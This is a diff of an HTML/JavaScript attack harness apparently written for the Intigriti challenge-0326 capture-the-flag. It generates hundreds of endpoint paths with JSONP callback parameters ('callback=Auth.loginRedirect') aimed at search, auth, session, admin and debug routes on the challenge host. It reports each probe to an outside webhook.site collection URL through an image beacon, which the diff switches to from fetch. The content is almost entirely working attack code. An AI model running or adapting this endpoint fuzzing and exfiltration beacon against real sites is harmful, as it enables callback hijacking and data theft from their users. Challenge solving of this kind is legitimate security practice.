@@ -3,18 +3,15 @@
 <title>challenge0326 batch harness</title>
 <body>batch-harness</body>
 <script>
-const RUN = 'seq2';
+const RUN = 'seq3';
 const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
 const TARGET = 'https://challenge-0326.intigriti.io/challenge.html?q=';
 const STEP_DELAY_MS = 2000;
 const BATCH_SIZE = 60;
 
 function ping(message) {
-  fetch(`${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`, {
-    mode: 'no-cors',
-    credentials: 'omit',
-    cache: 'no-store'
-  }).catch(() => {});
+  const image = new Image();
+  image.src = `${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`;
 }
 
 function chunk(items, size) {
@@ -47,119 +44,127 @@ function toChallengeUrl(batchId, requestPaths) {
 
 function buildCandidates() {
   const set = new Set();
-  const callbackValue = 'Auth.loginRedirect';
-  const callbackKeys = ['callback', 'cb'];
-  const jsonpModes = ['format=jsonp'];
 
   function add(path) {
     set.add(path);
   }
 
-  function addCallbackVariants(path) {
-    add(path);
-    const separator = path.includes('?') ? '&' : '?';
-    for (const key of callbackKeys) {
-      add(`${path}${separator}${key}=${encodeURIComponent(callbackValue)}`);
-    }
-    for (const mode of jsonpModes) {
-      add(`${path}${separator}${mode}&callback=${encodeURIComponent(callbackValue)}`);
+  function addVariants(basePath, variants) {
+    add(basePath);
+    for (const variant of variants) {
+      const separator = basePath.includes('?') ? '&' : '?';
+      add(`${basePath}${separator}${variant}`);
     }
   }
 
   [
     '/search',
-    '/query',
-    '/results',
-    '/records',
-    '/datastore',
-    '/intelligence',
-    '/threats',
-    '/intel',
-    '/ops',
-    '/operational',
     '/api/search',
-    '/api/query',
-    '/api/results',
-    '/api/records',
-    '/api/datastore',
-    '/api/intelligence',
-    '/api/threats',
-    '/api/intel',
-    '/api/ops',
     '/internal/search',
     '/api/internal/search',
     '/search/internal',
-    '/search/results'
+    '/portal/search',
+    '/api/portal/search',
+    '/query',
+    '/lookup',
+    '/results'
   ].forEach(base => {
-    addCallbackVariants(`${base}?domain=internal&q=x`);
-    addCallbackVariants(`${base}?domain=internal&query=x`);
-    addCallbackVariants(`${base}?q=x`);
+    addVariants(base, [
+      'callback=Auth.loginRedirect&q=test&domain=internal',
+      'callback=Auth.loginRedirect&q=*&domain=internal',
+      'callback=Auth.loginRedirect&q=%25&domain=internal',
+      'callback=Auth.loginRedirect&q=test&scope=internal',
+      'callback=Auth.loginRedirect&q=test&source=internal',
+      'format=jsonp&callback=Auth.loginRedirect&q=test&domain=internal',
+      'cb=Auth.loginRedirect&q=test&domain=internal',
+      'callback=Auth.loginRedirect&q=test'
+    ]);
   });
 
   [
-    '/auth',
-    '/login',
-    '/session',
-    '/me',
-    '/user',
-    '/profile',
-    '/account',
-    '/flag',
     '/auth/callback',
-    '/auth/redirect',
-    '/auth/return',
-    '/auth/result',
-    '/auth/complete',
-    '/auth/finish',
     '/login/callback',
-    '/login/redirect',
-    '/session/callback',
-    '/session/redirect',
-    '/session/me',
-    '/auth/me',
-    '/api/session',
-    '/api/me',
-    '/api/user',
-    '/api/profile',
-    '/api/account',
-    '/api/flag',
-    '/api/auth',
-    '/api/auth/callback',
-    '/api/auth/session',
-    '/api/auth/me',
+    '/signin/callback',
+    '/sso/callback',
     '/oauth/callback',
     '/oauth2/callback',
     '/oidc/callback',
-    '/signin-oidc',
-    '/signout-callback-oidc',
-    '/sso/callback'
-  ].forEach(addCallbackVariants);
+    '/auth/redirect',
+    '/login/redirect',
+    '/auth/return',
+    '/auth/result',
+    '/session/redirect',
+    '/signin-oidc'
+  ].forEach(base => {
+    addVariants(base, [
+      'callback=Auth.loginRedirect&code=x&state=x',
+      'callback=window.Auth.loginRedirect&code=x&state=x',
+      'callback=top.Auth.loginRedirect&code=x&state=x',
+      'callback=Auth.loginRedirect&error=access_denied',
+      'callback=Auth.loginRedirect&token=x',
+      'callback=Auth.loginRedirect&next=%2F',
+      'callback=Auth.loginRedirect&returnTo=%2F',
+      'callback=Auth.loginRedirect&redirect=%2F',
+      'callback=Auth.loginRedirect&redirect_uri=%2F',
+      'cb=Auth.loginRedirect&code=x&state=x',
+      'format=jsonp&callback=Auth.loginRedirect&code=x&state=x',
+      'format=jsonp&callback=Auth.loginRedirect&token=x'
+    ]);
+  });
+
+  [
+    '/session',
+    '/api/session',
+    '/auth/session',
+    '/session/me',
+    '/me',
+    '/api/me',
+    '/whoami',
+    '/profile',
+    '/bootstrap',
+    '/init',
+    '/context',
+    '/config',
+    '/auth-callback',
+    '/login-redirect',
+    '/session-callback',
+    '/callback-handler',
+    '/auth-handler',
+    '/session-handler'
+  ].forEach(base => {
+    addVariants(base, [
+      'callback=Auth.loginRedirect',
+      'format=jsonp&callback=Auth.loginRedirect',
+      'callback=Auth.loginRedirect&raw=1',
+      'callback=Auth.loginRedirect&full=1',
+      'callback=Auth.loginRedirect&include=user',
+      'callback=Auth.loginRedirect&include=config',
+      'cb=Auth.loginRedirect'
+    ]);
+  });
 
   [
     '/admin',
-    '/admin/review',
-    '/admin/panel',
-    '/admin/callback',
     '/admin/session',
+    '/admin/config',
+    '/admin/bootstrap',
     '/debug',
-    '/debug/auth',
     '/debug/session',
-    '/debug/callback',
-    '/review',
-    '/status',
-    '/health',
-    '/diag',
-    '/diagnostics',
-    '/config',
-    '/env',
-    '/whoami',
-    '/api/status',
-    '/api/config',
-    '/api/debug',
-    '/api/review',
-    '/api/report',
-    '/api/admin'
-  ].forEach(addCallbackVariants);
+    '/debug/config',
+    '/internal',
+    '/internal/session',
+    '/internal/config'
+  ].forEach(base => {
+    addVariants(base, [
+      'callback=Auth.loginRedirect',
+      'format=jsonp&callback=Auth.loginRedirect',
+      'callback=Auth.loginRedirect&debug=1',
+      'callback=Auth.loginRedirect&admin=1',
+      'callback=Auth.loginRedirect&dump=1',
+      'callback=Auth.loginRedirect&verbose=1',
+      'cb=Auth.loginRedirect'
+    ]);
+  });
 
   return Array.from(set);
 }
